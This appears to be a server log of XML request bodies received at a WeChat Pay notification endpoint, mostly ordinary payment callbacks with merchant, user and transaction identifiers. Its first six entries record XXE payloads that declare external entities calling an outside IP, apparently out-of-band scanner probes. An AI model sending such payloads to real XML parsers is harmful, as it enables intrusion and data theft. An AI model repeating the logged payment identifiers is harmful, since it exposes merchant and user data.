03:14:44|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071503_566?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:14:44|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071503_566?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:22:42|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071503_566?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:22:42|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071503_566?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:29:26|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071503_566?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:29:26|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071503_566?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
15:40:08|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[PAB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2c2dd1d01a5]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[267061652037679401301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[2F4AB9C8D2A4D1ADB3533AF75583DEC4]]></sign>
<time_end><![CDATA[20190715154008]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000354201907157596133119]]></transaction_id>
</xml>'
| GET:array (
)
15:40:08|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'PAB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2c2dd1d01a5',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '267061652037679401301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '2F4AB9C8D2A4D1ADB3533AF75583DEC4',
  'time_end' => '20190715154008',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000354201907157596133119',
)
| GET:array (
)
15:43:35|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[PAB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2c2ea03b484]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[289061652058807701301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[032EFF58070DA15E8AB1C15B297F3E71]]></sign>
<time_end><![CDATA[20190715154334]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000354201907152720374392]]></transaction_id>
</xml>'
| GET:array (
)
15:43:35|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'PAB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2c2ea03b484',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '289061652058807701301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '032EFF58070DA15E8AB1C15B297F3E71',
  'time_end' => '20190715154334',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000354201907152720374392',
)
| GET:array (
)
22:22:30|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2c8c175ea37]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[250061654441963303201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[B58D83987179AB98C68D5867DB04E96C]]></sign>
<time_end><![CDATA[20190715222229]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000347201907159745587303]]></transaction_id>
</xml>'
| GET:array (
)
22:22:30|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2c8c175ea37',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '250061654441963303201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'B58D83987179AB98C68D5867DB04E96C',
  'time_end' => '20190715222229',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000347201907159745587303',
)
| GET:array (
)
22:31:41|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2c8e35500d6]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[232061654507570303201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[50700DC129943CEDFE520FAD083EAF50]]></sign>
<time_end><![CDATA[20190715223140]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000344201907156385641428]]></transaction_id>
</xml>'
| GET:array (
)
22:31:41|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2c8e35500d6',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '232061654507570303201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '50700DC129943CEDFE520FAD083EAF50',
  'time_end' => '20190715223140',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000344201907156385641428',
)
| GET:array (
)
22:59:55|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[PAB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2c94e1dd447]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[274061654677776601301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[5B491FF97111165F8B4513CB25BBDC5D]]></sign>
<time_end><![CDATA[20190715225954]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000339201907156468361022]]></transaction_id>
</xml>'
| GET:array (
)
22:59:55|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'PAB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2c94e1dd447',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '274061654677776601301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '5B491FF97111165F8B4513CB25BBDC5D',
  'time_end' => '20190715225954',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000339201907156468361022',
)
| GET:array (
)
